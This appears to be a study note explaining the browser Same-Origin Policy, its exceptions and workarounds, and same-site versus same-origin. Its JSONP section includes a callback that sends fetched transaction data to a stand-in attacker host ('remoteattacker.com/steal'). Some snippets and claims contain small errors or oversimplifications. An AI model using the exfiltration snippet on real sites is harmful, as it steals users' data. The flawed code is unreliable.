---
title: Same-Origin Policy
description: Same-Origin Policy is a critical security mechanism that restricts how a document or script loaded by one origin can interact with a resource from another origin.
---

# Same-Origin Policy (SOP)

Same-Origin Policy is a critical security mechanism that restricts how a document or script loaded by one origin can interact with a resource from another origin.

- This is the fundamental security model of the web

- Two pages from different sources should not be allowed to interfere with each other

- It helps isolate potentially malicious documents, reducing possible attack vectors.

- For example, it prevents a malicious website on the Internet from running JavaScript in a browser to read data from a third-party webmail service (which the user is signed into) or a company intranet (which is protected from direct access by the attacker by not having a public IP address) and relaying that data to the attacker.

## Origin

Assume the web is an operating system:

- An **origin** is analogous to an OS process
- The **web browser** itself is analogous to an OS **kernel**
- Sites rely on the browser to enforce all the system's security rules:

  - Just like in OSes, if there's a bug in the browser itself then all these rules go out the window

The basic rule:

- Given **two separate JavaScript execution contexts**, one should be able to access the other only if the **protocols, hostnames, and port numbers** associated with their host documents **match exactly**

- This **"protocol-host-port tuple"** is called an **"origin"**

Two URIs are part of the same origin, if they have the same `scheme`, `host` and `port`, in terms of an [URL](./../Web/URL.md):

- `scheme`: HTTP or HTTPS protocol
- `host`: Hostname or Domain name
- `port`: Port number (80 or 443 or any other number)

_Example:_

```url
<!-- SCHEME + HOST (Domain) + PORT (Implicit)-->
https://example.org:443

<!-- SCHEME + HOST (Domain + Sub Domain) + PORT (Implicit)-->
https://mypage.example.org:443
```

_Example:_ Logic to check if two URLs are same origin:

```javascript
function isSameOrigin(url1, url2) {
  return (
    url1.protocol === url2.protocol &&
    url1.hostname === url2.hostname &&
    url1.port === url2.port
  );
}
```

- Same Origin:

  ```url
  https://foo.example.org
  https://foo.example.org/mypage
  ```

- Cross Origin:

  ```url
  // Hostname don't match
  https://foo.github.io
  https://bar.github.io

  // Hostname don't match
  https://example.org
  https://www.example.org

  // Protocol don't match
  https://example.org
  http://example.org

  // Port don't match
  https://example.org:81/
  https://example.org:80/
  ```

## Applicable

### HTTP Methods

HTTP Method behaviour for SOP:

- `HEAD`, `GET`, `POST` Methods:

  - Request reaches server
  - Response comes back but Browser blocks it

- `PUT`, `DELETE`, `PATCH`, ... Methods:

  - Request is blocked by Browser

### JavaScript

Which is blocked?

- **Web Forms: SOP does not apply**

  - Scripts, images, etc. which remain constant:

    ```url
    <script src="https://cross-origin/my.js">
    ```

  - Cross-origin web forms:

    ```url
    <form action="https://cross-origin/getmyval" method="GET">
    ```

- **JavaScript: SOP applies**

  - Content operated via XMLHTTPRequest or Fetch (APIs):

    ```url
    fetch("https://cross-origin/getmyval")
    ```

### iframe

- Web page `https://cross-origin/home.html` can embed `https://example.org` using iframe, even though they are Cross-origin

- But the embedded site content cannot be modified.

_Example:_

```javascript
// Embedding website using iframe
cont iframe = document.createElement('iframe');

iframe.src = 'https://example.org';

document.body.append(iframe);

// If we try to access the embedded site content
// we get error
iframe.contentDocument.cookie
// Uncaught TypeError: Cannot read property 'cookie' of null

iframe.contentDocument
// null
```

- We can change the iframe source

### Cookies

- Cookies are not blocked by SOP

## Problems With SOP

- Sometimes policy is too **narrow**: Difficult to get `https://login.example.org` and `https://mypage.example.org` to exchange data

- Sometimes policy is too **broad**: No way to isolate `https://example.org/users/1` from `https://example.org/users/admin`

- Policy is not enforced for certain web features

## Workaround For SOP

Methods to work around SOP restrictions in ajax

- `JSONP`: (JSON with Padding) provides work-around for this SOP problem:

  - Run JavaScript code inside HTML file with `<script>` tag
  - Script tag can reference URL that doesn't have a js extension
  - Code inside JavaScript file has access to everything that is in scope
  - Padded JSON response is surrounded by JavaScript function
  - No official spec for JSONP. It's a hack

    ```html
    <!-- URL -->
    <script
      src="http://internal.api.dev/api/transactions/jsonp?callback=accntResult"
    >

      <!-- Callback function -->
      <script>
          function accountResult(data) {
          // Send code to remote attacker
          fetch(
              "https://remoteattacker.com/steal?" +
              new URLSearchParams({
                  dump: data,
              })
          );
          }
    </script>

    <!-- Data -->
    accountResult({'transactions': [{'transactionId': 378954, 'amount': ...)
    ```

- `document.domain`:

  - Need a way around SOP to allow two different origins to communicate
  - Two cooperating sites can agree that for the purpose of SOP checks, they want to be considered equivalent
  - Sites must share a common top-level domain
  - _Example:_ both `https://login.example.org` and `https://mypage.example.org` may perform the following assignment:

    ```javascript
    document.domain = "example.org";
    ```

  - Both origins must explicitly opt-in to this feature
  - So, if `https://attacker.example.org` runs:

    ```javascript
    document.domain = "example.org";
    ```

  - Then `https://attacker.example.org` still cannot access content on `https://example.org`
  - `https://example.org` also needs to run the same code to opt-in to this behaviour:

    ```javascript
    document.domain = "example.org";
    ```

  - **`document.domain` is a bad idea**
  - In order for `https://login.example.org` and `https://mypage.example.org` to communicate, they must set:

    ```javascript
    document.domain = "example.org";
    ```

  - This allows anyone to join the party:

    - `https://attacker.example.org` can also set `document.domain` to `example.org` to become same origin with the others

  - This is a opt-in:

    | Originating URL               | `document.domain` | Accessed URL                   | `document.domain` | Allowed? |
    | ----------------------------- | ----------------- | ------------------------------ | ----------------- | :------: |
    | `http://www.example.org`      | `example.com`     | `http://payments.example.org`  | `example.com`     |   Yes    |
    | `http://www.example.org`      | `example.com`     | `https://payments.example.org` | `example.com`     |    No    |
    | `http://payments.example.org` | `example.com`     | `https//example.org`           | (not set)         |    No    |
    | `http://www.example.org`      | (not set)         | `http://www.example.org`       | `example.com`     |    No    |

- `iframe`:

  - Send message from a parent page to a child iframe
  - Need a way around SOP to allow two different origins to communicate
  - What if we encoded data in URL fragment identifiers?

    - Gap in SOP
    - Parent is allowed to navigate child iframes
    - Child can poll for changes to the fragment identifier

- **The `postMessage` API**:

  - Secure cross-origin communications between cooperating origins
  - Send strings and arbitrarily complicated data cross-origin
  - Useful features:

    - "Structured clone" algorithm used for complicated objects. Handles cycles. Can't handle object instances, functions, DOM nodes.
    - "Transferable objects" allow transferring ownership of an object. It becomes unusable (neutered) in the context it was sent from.

## Same-Origin and Same-Site

What is valuable in client-side?

- Same-Origin Policy
- Same-Site restrictions

Are "Site" and "Origin" same?

Two URLs have the same origin if the protocol, port (if specified), and host are the same for both

| URL1                                     | URL2                                              | Outcome     | Reason                                           |
| ---------------------------------------- | ------------------------------------------------- | ----------- | ------------------------------------------------ |
| `http://store.company.com/dir/page.html` | `http://store.company.com/dir2/other.html`        | Same origin | Only the path differs                            |
|                                          | `http://store.company.com/dir/inner/another.html` | Same origin | Only the path differs                            |
|                                          | `https://store.company.com/page.html`             | Failure     | Different protocol                               |
|                                          | `http://store.company.com:81/dir/page.html`       | Failure     | Different port (`http://` is port 80 by default) |
|                                          | `http://news.company.com/dir/page.html`           | Failure     | Different host                                   |

| Origin A                      | Origin B                                | Whether Origin A and B are "schemeful same-site"           |
| ----------------------------- | --------------------------------------- | ---------------------------------------------------------- |
| `https://www.example.com:443` | `https://`**`www.evil.com`**`:443`      | cross-site: different domains                              |
|                               | `https://`**`login.`**`example.com:443` | **schemeful same-site: different subdomains don't matter** |
|                               | **`http:`**`//www.example.com:443`      | cross-site: different schemes                              |
|                               | `https://www.example.com`**`:80`**      | **schemeful same-site: different ports don't matter**      |
|                               | **`https://www.example.com:443`**       | **schemeful same-site: exact match**                       |
|                               | **`https://www.example.com`**           | **schemeful same-site: ports don't matter**                |
